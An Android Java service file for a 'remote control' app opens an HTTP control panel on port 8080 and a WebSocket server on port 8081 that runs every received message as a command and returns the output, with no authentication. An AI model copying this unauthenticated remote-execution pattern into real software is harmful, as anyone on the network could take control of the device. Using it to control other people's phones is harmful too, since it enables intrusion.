package com.mycompany.myapp3;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import androidx.core.app.NotificationCompat;

import org.java_websocket.WebSocket;
import org.java_websocket.handshake.ClientHandshake;
import org.java_websocket.server.WebSocketServer;

import java.net.InetSocketAddress;
import java.util.concurrent.ConcurrentHashMap;

public class WebServerService extends Service {
    private WebSocketServer wsServer;
    private SimpleHttpServer httpServer;
    private ConcurrentHashMap<String, WebSocket> clients = new ConcurrentHashMap<>();

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();

        // 启动内置 HTTP 控制面板服务 (端口 8080)
        httpServer = new SimpleHttpServer(8080, this);
        httpServer.start();

        // 启动 WebSocket 实时指令交互服务 (端口 8081)
        wsServer = new WebSocketServer(new InetSocketAddress(8081)) {
            @Override
            public void onOpen(WebSocket conn, ClientHandshake handshake) {
                String id = "client_" + System.currentTimeMillis();
                clients.put(id, conn);
            }

            @Override
            public void onClose(WebSocket conn, int code, String reason, boolean remote) {
                clients.values().remove(conn);
            }

            @Override
            public void onMessage(WebSocket conn, String message) {
                String result = CommandExecutor.execute(message);
                conn.send(result);
            }

            @Override
            public void onError(WebSocket conn, Exception ex) {
                ex.printStackTrace();
            }

            @Override
            public void onStart() {
                System.out.println("WebSocket 服务已启动");
            }
        };
        wsServer.start();

        startForeground(1, createNotification());
    }

    private Notification createNotification() {
        return new NotificationCompat.Builder(this, "rcs_channel")
                .setContentTitle("RCS 远控服务")
                .setContentText("后台运行中")
                .setSmallIcon(android.R.drawable.ic_menu_compass)
                .build();
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel("rcs_channel", "RCS", NotificationManager.IMPORTANCE_LOW);
            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(channel);
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (wsServer != null) wsServer.stop();
        if (httpServer != null) httpServer.stop();
    }
}